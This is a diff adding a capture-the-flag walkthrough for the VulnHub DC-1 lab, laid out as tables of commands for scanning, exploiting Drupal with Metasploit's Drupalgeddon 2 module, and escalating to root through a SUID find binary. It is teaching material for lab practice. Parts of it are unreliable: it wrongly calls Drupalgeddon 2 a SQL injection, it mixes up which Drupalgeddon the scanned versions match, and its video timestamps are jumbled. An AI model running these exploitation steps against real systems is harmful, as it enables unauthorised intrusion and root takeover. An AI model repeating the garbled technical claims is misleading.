@@ -1,0 +1,73 @@
+This walkthrough for the VulnHub DC-1 machine, which is excellent preparation for the OSCP exam, covers the essential phases of a penetration test: enumeration, exploitation, and privilege escalation.
+
+***
+
+## 1. Initial Enumeration and Reconnaissance
+
+The initial phase focuses on discovering open ports, running services, and the target's operating system and versioning.
+
+| Command | Purpose | Notes / Key Takeaways | Timestamp |
+| :--- | :--- | :--- | :--- |
+| `nmap -p- -sC -sV [TARGET_IP] --open` | Full port scan to discover all open ports and run default scripts (`-sC`) to identify service versions (`-sV`). | The scan reveals **Port 80 (HTTP)** running a web server and **Port 22 (SSH)**. | [[01:49:58](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=6598)] |
+| Manual Web Enumeration | Browsing the target IP and checking files like `/robots.txt`. | Reveals the target is running a **Drupal Content Management System (CMS)** on a **Debian** operating system. | [[03:24:46](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=12286)] |
+
+***
+
+## 2. Web Vulnerability Scanning and Exploitation
+
+The focus shifts to the open web service (Drupal) to find a version-specific vulnerability.
+
+### A. DrupScan for Versioning
+
+| Command | Purpose | Notes / Key Takeaways | Timestamp |
+| :--- | :--- | :--- | :--- |
+| `pip3 install drup scan==1.4.0.1` | **Installation** of the correct DrupScan version (if not already installed). | The speaker notes that specific versions are sometimes required to avoid errors with modern Python. | [[10:01](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=601)] |
+| `drup scan scan --drupal -u http://[TARGET_IP]/` | Scans the Drupal site for installed modules, themes, and version information. | The scan identifies a version between **7.22 and 7.26**, which is vulnerable to **Drupalgeddon**. | [[12:06](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=726)] |
+
+### B. Exploitation via Metasploit
+
+The **Drupalgeddon 2** vulnerability (CVE-2018-7600) is used to gain an initial shell.
+
+| Command | Purpose | Notes / Key Takeaways | Timestamp |
+| :--- | :--- | :--- | :--- |
+| `msfconsole` | Launches the Metasploit Framework console. | This is a required tool for OSCP, but its use is restricted to one machine/process in the exam. | [[13:02](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=782)] |
+| `search drupal` | Finds relevant Metasploit modules. | The search results confirm the existence of the `drupal_drupalgeddon2` module. | [[13:10](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=790)] |
+| `use exploit/unix/webapp/drupal_drupalgeddon2` | Selects the Drupalgeddon 2 module. | This module uses a SQL injection vulnerability to achieve remote code execution. | [[13:38](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=818)] |
+| `set RHOSTS [TARGET_IP]` | Sets the target machine's IP address. | Always verify required options by typing `options` before running the exploit. | [[13:52](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=832)] |
+| `run` or `exploit` | Executes the module to gain a shell. | Results in a **Meterpreter session**, which is then converted to a **shell** session. | [[16:20](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=980)] |
+
+### C. Shell Stabilization
+
+After obtaining a shell, it is stabilized into a fully interactive TTY for better usability.
+
+| Command | Purpose | Notes / Key Takeaways | Timestamp |
+| :--- | :--- | :--- | :--- |
+| `shell` | Drops from the Meterpreter session to a system shell. | The initial shell is often non-interactive. | [[17:06](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=1026)] |
+| `python -c 'import pty; pty.spawn("/bin/bash")'` | Uses Python to spawn a fully functional bash TTY shell. | Essential for using commands like `clear` and for smoother interaction. | [[17:31](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=1051)] |
+
+***
+
+## 3. Privilege Escalation
+
+The goal is to move from the low-privilege `www-data` user to `root`.
+
+### A. Local Enumeration for Privilege Escalation
+
+Key commands to gather information that could lead to privilege escalation:
+
+| Command | Purpose | Key Finding | Timestamp |
+| :--- | :--- | :--- | :--- |
+| `uname -a` | Displays the system kernel version. | Used to determine if the system is vulnerable to a public kernel exploit. | [[01:09:16](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=4156)] |
+| `netstat -tunelp \| grep -i 127.0.0.1` | Checks for network services listening only on the **localhost** (127.0.0.1). | Finds services like MySQL and SMTP that might be exploitable locally. | [[02:20:01](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=8401)] |
+| `find / -perm -4000 -type f 2>/dev/null` | **Crucial OSCP Command:** Searches the entire filesystem for files with the **SUID (Set User ID)** bit set. | This reveals potential binaries that run with root privileges, regardless of the calling user. The binary **/usr/bin/find** is identified as SUID. | [[02:51:50](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=10310)] |
+
+### B. Exploiting SUID `find`
+
+The SUID permission on the `find` binary is abused to execute a privileged shell. This technique is often referenced on sites like **GTFOBins** [[02:53:57](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=10437)].
+
+| Command | Purpose | Notes / Key Takeaways | Timestamp |
+| :--- | :--- | :--- | :--- |
+| `/usr/bin/find . -exec /bin/bash -p \; -quit` | Executes the SUID `find` binary, which runs as root, and then uses the `-exec` flag to execute a privileged bash shell (`/bin/bash -p`). | **The `-p` flag is critical** because it tells the shell to run with **effective privileges** (root, in this case), not just real privileges. | [[03:08:16](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=11296)] |
+| `id` | Confirms the current user ID and effective user ID. | The output `uid=0(root)` and `euid=0(root)` confirms a successful root shell. | [[03:10:05](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=11405)] |
+| `cat /root/final_flag.txt` | Retrieves the proof-of-concept file (flag) required for the exam report. | This completes the machine and is required for submission. | [[03:22:24](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=12144)] |
+http://googleusercontent.com/youtube_content/0
